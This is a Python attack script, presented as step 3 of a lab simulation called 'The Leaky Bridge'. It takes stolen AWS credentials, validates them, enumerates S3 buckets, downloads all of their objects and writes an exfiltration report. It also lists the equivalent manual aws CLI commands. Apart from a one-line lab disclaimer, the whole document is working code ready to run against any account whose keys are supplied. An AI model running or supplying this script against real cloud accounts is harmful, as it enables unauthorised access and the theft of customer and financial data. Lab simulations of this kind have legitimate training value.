#!/usr/bin/env python3
"""
============================================================
  attack/03_cloud_pivot.py — Step 3: Cloud Pivot
  Project: The Leaky Bridge – Hybrid Cloud Attack Vector
============================================================

PURPOSE:
  Using the stolen AWS credentials from Step 2, this script:
    1. Validates the stolen credentials (who am I?)
    2. Enumerates all accessible S3 buckets
    3. Lists objects inside each bucket
    4. Downloads sensitive files from the target bucket
    5. Generates an exfiltration report

MANUAL EQUIVALENT COMMANDS (what this script automates):
  aws configure --profile stolen
  aws sts get-caller-identity --profile stolen
  aws s3 ls --profile stolen
  aws s3 ls s3://corp-sensitive-docs-prod/ --profile stolen
  aws s3 cp s3://corp-sensitive-docs-prod/customer_data.csv . --profile stolen

  *** FOR LAB / EDUCATIONAL USE ONLY ***
============================================================
"""

import boto3
import json
import argparse
import sys
import os
from datetime import datetime
from pathlib import Path
from botocore.exceptions import ClientError, NoCredentialsError

BANNER = """
╔══════════════════════════════════════════════════════════╗
║  STEP 3: CLOUD PIVOT & EXFILTRATION                     ║
║  The Leaky Bridge — Attack Simulation                    ║
╚══════════════════════════════════════════════════════════╝
"""

# ── Default stolen credentials (replace with actual found values) ──
STOLEN_ACCESS_KEY    = "AKIAIOSFODNN7EXAMPLE"
STOLEN_SECRET_KEY    = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
STOLEN_REGION        = "ap-southeast-1"
EXFIL_DIR            = "./exfiltrated"


def get_session(access_key: str, secret_key: str, region: str) -> boto3.Session:
    """Create a boto3 session using the stolen credentials."""
    return boto3.Session(
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        region_name=region
    )


def validate_credentials(session: boto3.Session) -> dict:
    """
    Use STS to verify who these credentials belong to.
    Equivalent to: aws sts get-caller-identity
    """
    print("[1/4] Validating stolen credentials with AWS STS...")
    sts = session.client('sts')
    try:
        identity = sts.get_caller_identity()
        print(f"    [+] CREDENTIALS VALID!")
        print(f"    [+] Account ID : {identity['Account']}")
        print(f"    [+] User ARN   : {identity['Arn']}")
        print(f"    [+] User ID    : {identity['UserId']}")
        return identity
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'InvalidClientTokenId':
            print("    [-] Access Key is invalid or expired.")
        elif code == 'SignatureDoesNotMatch':
            print("    [-] Secret Key is incorrect.")
        else:
            print(f"    [-] AWS Error: {e}")
        sys.exit(1)
    except NoCredentialsError:
        print("    [-] No credentials provided.")
        sys.exit(1)


def enumerate_buckets(session: boto3.Session) -> list:
    """
    List all S3 buckets accessible with these credentials.
    Equivalent to: aws s3 ls
    """
    print("\n[2/4] Enumerating all accessible S3 buckets...")
    s3 = session.client('s3')
    try:
        response = s3.list_buckets()
        buckets  = response.get('Buckets', [])

        if not buckets:
            print("    [-] No buckets found or no ListAllMyBuckets permission.")
            return []

        print(f"    [+] Found {len(buckets)} bucket(s):")
        for bucket in buckets:
            print(f"        → s3://{bucket['Name']}  (created: {bucket['CreationDate'].strftime('%Y-%m-%d')})")

        return [b['Name'] for b in buckets]
    except ClientError as e:
        print(f"    [-] Error listing buckets: {e}")
        return []


def list_bucket_contents(session: boto3.Session, bucket_name: str) -> list:
    """
    List all objects inside a specific bucket.
    Equivalent to: aws s3 ls s3://<bucket>/ --recursive
    """
    print(f"\n[3/4] Listing objects in s3://{bucket_name}/...")
    s3      = session.client('s3')
    objects = []

    try:
        paginator = s3.get_paginator('list_objects_v2')
        for page in paginator.paginate(Bucket=bucket_name):
            for obj in page.get('Contents', []):
                objects.append({
                    "key":           obj['Key'],
                    "size_bytes":    obj['Size'],
                    "size_human":    _human_size(obj['Size']),
                    "last_modified": obj['LastModified'].strftime('%Y-%m-%d %H:%M:%S'),
                })
                print(f"    → {obj['Key']:<40} {_human_size(obj['Size']):>10}  {obj['LastModified'].strftime('%Y-%m-%d')}")

        print(f"\n    [+] Total: {len(objects)} object(s) found")
    except ClientError as e:
        print(f"    [-] Cannot access bucket '{bucket_name}': {e}")

    return objects


def exfiltrate(session: boto3.Session, bucket_name: str, objects: list,
               output_dir: str = EXFIL_DIR) -> list:
    """
    Download all objects from the bucket to local machine.
    Equivalent to: aws s3 cp s3://<bucket>/ ./ --recursive
    """
    print(f"\n[4/4] Exfiltrating {len(objects)} file(s) from s3://{bucket_name}/...")
    s3       = session.client('s3')
    out_path = Path(output_dir) / bucket_name
    out_path.mkdir(parents=True, exist_ok=True)
    downloaded = []

    for obj in objects:
        key       = obj['key']
        dest_file = out_path / key.replace('/', os.sep)
        dest_file.parent.mkdir(parents=True, exist_ok=True)

        print(f"    [↓] Downloading: s3://{bucket_name}/{key}")
        try:
            s3.download_file(bucket_name, key, str(dest_file))
            print(f"        → Saved to: {dest_file} ({obj['size_human']})")
            downloaded.append({"key": key, "local_path": str(dest_file), "size": obj["size_human"]})
        except ClientError as e:
            print(f"        [!] Failed: {e}")

    return downloaded


def generate_report(identity: dict, buckets: list, downloaded: list,
                    access_key: str, region: str):
    """Generate a JSON exfiltration report."""
    report = {
        "attack":       "The Leaky Bridge — Cloud Pivot",
        "timestamp":    datetime.now().isoformat(),
        "stolen_key_id": access_key,
        "victim_account": {
            "account_id": identity.get("Account"),
            "user_arn":   identity.get("Arn"),
        },
        "buckets_enumerated": buckets,
        "files_exfiltrated":  downloaded,
        "impact": f"{len(downloaded)} sensitive file(s) stolen from {len(buckets)} bucket(s)"
    }

    report_path = Path(EXFIL_DIR) / "exfil_report.json"
    report_path.parent.mkdir(parents=True, exist_ok=True)
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2)

    print(f"\n{'═'*58}")
    print(f"  ✅ EXFILTRATION COMPLETE")
    print(f"{'═'*58}")
    print(f"  Victim Account : {identity.get('Account', 'Unknown')}")
    print(f"  Files Stolen   : {len(downloaded)}")
    for d in downloaded:
        print(f"    → {d['key']} ({d['size']}) → {d['local_path']}")
    print(f"  Report saved   : {report_path}")
    print(f"\n  ─── ATTACK IMPACT ──────────────────────────────────")
    print(f"  {report['impact']}")
    print(f"  CRITICAL: Customer PII and financial data exposed!")
    print(f"{'═'*58}\n")


def _human_size(size_bytes: int) -> str:
    """Convert bytes to human-readable size."""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"


if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="The Leaky Bridge — Step 3: Cloud Pivot")
    parser.add_argument('--access-key', default=STOLEN_ACCESS_KEY, help='Stolen AWS Access Key ID')
    parser.add_argument('--secret-key', default=STOLEN_SECRET_KEY, help='Stolen AWS Secret Key')
    parser.add_argument('--region',     default=STOLEN_REGION,     help='AWS Region')
    parser.add_argument('--bucket',     help='Target specific bucket (skip enumeration)')
    parser.add_argument('--output',     default=EXFIL_DIR,          help='Local output directory')
    args = parser.parse_args()

    print(f"[*] Timestamp  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Access Key : {args.access_key}")
    print(f"[*] Region     : {args.region}\n")

    session  = get_session(args.access_key, args.secret_key, args.region)
    identity = validate_credentials(session)
    buckets  = [args.bucket] if args.bucket else enumerate_buckets(session)

    all_downloaded = []
    for bucket in buckets:
        objects    = list_bucket_contents(session, bucket)
        downloaded = exfiltrate(session, bucket, objects, args.output)
        all_downloaded.extend(downloaded)

    generate_report(identity, buckets, all_downloaded, args.access_key, args.region)
